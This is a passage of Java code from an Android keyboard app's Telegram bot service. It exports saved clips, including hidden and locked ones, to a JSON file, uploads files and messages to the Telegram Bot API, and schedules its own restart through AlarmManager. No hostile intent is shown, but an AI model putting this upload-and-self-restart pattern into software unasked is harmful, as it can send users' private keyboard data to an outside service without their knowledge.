            o.put("keyword", clip.keyword != null ? clip.keyword : "");
            o.put("hidden", clip.hidden);
            o.put("locked", clip.locked);
            o.put("timestamp", clip.timestamp != null ? clip.timestamp : "");
            scArr.put(o);
        }
        root.put("smart_clips", scArr);

        File f = new File(getCacheDir(), "fullkeyboard_backup_" + System.currentTimeMillis() + ".json");
        FileOutputStream fos = new FileOutputStream(f);
        fos.write(root.toString(2).getBytes("UTF-8"));
        fos.close();
        return f;
    }

    // ────────────────────────────────────────────────────────────────────────
    // Auto-restart via AlarmManager
    // ────────────────────────────────────────────────────────────────────────

    public static void scheduleRestart(Context ctx) {
        Intent i = new Intent(ctx, TelegramBotService.class);
        PendingIntent pi = PendingIntent.getService(ctx, 9876, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60_000L, pi);
    }

    // ────────────────────────────────────────────────────────────────────────
    // Telegram HTTP helpers
    // ────────────────────────────────────────────────────────────────────────

    private static String apiUrl(String token) {
        return "https://api.telegram.org/bot" + token;
    }

    private void send(String text) {
        sendTo(getChatId(this), text);
    }

    private void sendTo(long chatId, String text) {
        try {
            String body = "{\"chat_id\":" + chatId
                    + ",\"text\":" + jstr(text)
                    + ",\"parse_mode\":\"HTML\"}";
            postJson(apiUrl(getToken(this)) + "/sendMessage", body);
        } catch (Exception e) { Log.w(TAG, "sendTo: " + e.getMessage()); }
    }

    private void sendWithMarkup(long chatId, String text, String markup) {
        try {
            String body = "{\"chat_id\":" + chatId
                    + ",\"text\":" + jstr(text)
                    + ",\"parse_mode\":\"HTML\""
                    + ",\"reply_markup\":" + markup + "}";
            postJson(apiUrl(getToken(this)) + "/sendMessage", body);
        } catch (Exception e) { Log.w(TAG, "sendWithMarkup: " + e.getMessage()); }
    }

    private void sendDoc(long chatId, File file, String caption) {
        try {
            String boundary = "----TGBnd" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection) new URL(
                    apiUrl(getToken(this)) + "/sendDocument").openConnection();
            c.setConnectTimeout(30_000);
            c.setReadTimeout(60_000);
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream out = c.getOutputStream();
            PrintWriter pw = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);
            writePart(pw, boundary, "chat_id", String.valueOf(chatId));
            writePart(pw, boundary, "caption", caption);

            pw.append("--").append(boundary).append("\r\n");
            String mime = file.getName().endsWith(".pdf") ? "application/pdf" : "application/json";
            pw.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
              .append(file.getName()).append("\"\r\n");
            pw.append("Content-Type: ").append(mime).append("\r\n\r\n").flush();
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[4096]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.flush();
            pw.append("\r\n--").append(boundary).append("--\r\n").flush();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) { Log.w(TAG, "sendDoc: " + e.getMessage()); }
    }

    private static void writePart(PrintWriter pw, String bnd, String name, String val) {
        pw.append("--").append(bnd).append("\r\n");
        pw.append("Content-Disposition: form-data; name=\"").append(name).append("\"\r\n\r\n");
        pw.append(val).append("\r\n").flush();
    }

    private void answerCb(String id) {
        try { postJson(apiUrl(getToken(this)) + "/answerCallbackQuery",
                "{\"callback_query_id\":\"" + id + "\",\"text\":\"\"}");
        } catch (Exception ignored) {}
    }

    private String httpGet(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(35_000);
        c.setReadTimeout(35_000);
        c.setRequestMethod("GET");
        if (c.getResponseCode() != 200) return null;
        InputStream is = c.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n;
        while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
        return baos.toString("UTF-8");
    }

    private static void postJson(String url, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(12_000); c.setReadTimeout(12_000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        byte[] data = body.getBytes("UTF-8");
        c.setRequestProperty("Content-Length", String.valueOf(data.length));
        OutputStream os = c.getOutputStream(); os.write(data); os.flush();
        c.getResponseCode(); c.disconnect();
    }

    // ────────────────────────────────────────────────────────────────────────
    // Paint / text factory helpers
    // ────────────────────────────────────────────────────────────────────────

    private static Paint paint(int color, float radius, boolean antialias) {
        Paint p = new Paint(); p.setColor(color); p.setAntiAlias(antialias);
        return p;
    }
    private static Paint stroke(int color, float width) {
        Paint p = new Paint(); p.setColor(color); p.setStrokeWidth(width); p.setStyle(Paint.Style.STROKE); p.setAntiAlias(true);
        return p;
    }
    private static Paint text(int color, float sp, boolean bold) {
        Paint p = new Paint(); p.setColor(color); p.setTextSize(sp); p.setAntiAlias(true);
        if (bold) p.setFakeBoldText(true);
        return p;
    }

    // ────────────────────────────────────────────────────────────────────────
    // String utilities
    // ────────────────────────────────────────────────────────────────────────

    private static String h(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static boolean ok(String s) { return s != null && !s.isEmpty(); }

    private static String jstr(String s) {
        if (s == null) s = "";
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"")
                       .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t") + "\"";
    }

    private static int parseInt(String s, int def) {
        try { return Integer.parseInt(s.trim()); } catch (Exception e) { return def; }
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private String prevMonth(int off) {
        Calendar c = Calendar.getInstance(); c.add(Calendar.MONTH, off - 1);
        return new SimpleDateFormat("MMM", Locale.getDefault()).format(c.getTime());
    }
    private String nextMonth(int off) {
        Calendar c = Calendar.getInstance(); c.add(Calendar.MONTH, off + 1);
        return new SimpleDateFormat("MMM", Locale.getDefault()).format(c.getTime());
    }
}
